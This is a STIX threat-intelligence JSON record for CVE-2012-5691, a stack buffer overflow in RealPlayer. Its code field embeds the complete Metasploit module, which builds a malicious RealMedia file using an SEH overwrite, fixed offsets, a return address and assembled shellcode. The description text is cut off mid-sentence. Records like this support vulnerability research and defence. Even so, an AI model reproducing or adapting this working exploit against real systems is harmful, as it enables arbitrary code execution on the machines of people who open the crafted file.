{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ff884c4f-28b2-4565-a6da-bf9498b3f507",
    "created": "2024-08-14T16:37:04.41212Z",
    "modified": "2024-08-14T16:37:04.412125Z",
    "name": "RealPlayer RealMedia File Handling Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow on RealPlayer <=15.0.6.14. The vulnerability exists in the handling of real media files, due to the insecure",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/real_player_url_property_bof.rb",
            "external_id": "real_player_url_property_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5691"
        },
        {
            "source_name": "reference",
            "url": "http://service.real.com/realplayer/security/12142012_player/en/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'RealPlayer RealMedia File Handling Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow on RealPlayer <=15.0.6.14.\n        The vulnerability exists in the handling of real media files, due to the insecure\n        usage of the GetPrivateProfileString function to retrieve the URL property from an\n        InternetShortcut section.\n\n        This module generates a malicious rm file which must be opened with RealPlayer via\n        drag and drop or double click methods. It has been tested successfully on Windows\n        XP SP3 with RealPlayer 15.0.5.109.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'suto <suto[at]vnsecurity.net>' # Vulnerability discovery, metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-5691' ],\n          [ 'OSVDB', '88486' ],\n          [ 'BID', '56956' ],\n          [ 'URL', 'http://service.real.com/realplayer/security/12142012_player/en/' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars'    => \"\\x00\\x0a\\x0d\",\n          'DisableNops' => true,\n          'Space'       => 2000\n        },\n      'Targets'        =>\n        [\n          [ 'Windows XP SP3 / Real Player 15.0.5.109',\n            {\n              'Ret'       => 0x63f2b4b5, # ppr from rpap3260.dll\n              'OffsetOne' => 2312, # Open via double click\n              'OffsetTwo' => 2964 # Open via drag and drop\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-12-14',\n      'DefaultTarget'  => 0))\n\n    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.rm']),])\n\n  end\n\n  def exploit\n\n    buffer = payload.encoded\n    buffer << rand_text(target['OffsetOne'] - buffer.length) # Open the file via double click\n    buffer << generate_seh_record(target.ret)\n    buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"call $-#{target['OffsetOne'] + 8}\").encode_string\n    buffer << rand_text(target['OffsetTwo'] - buffer.length) # Open the file via drag and drop to the real player\n    buffer << generate_seh_record(target.ret)\n    buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"call $-#{target['OffsetTwo'] + 8}\").encode_string\n    buffer << rand_text(7000) # Generate exception\n\n    content = \"[InternetShortcut]\\nURL=\"\n    filecontent = content+buffer\n\n    file_create(filecontent)\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-12-14",
    "x_mitre_platforms": [
        "win'"
    ]
}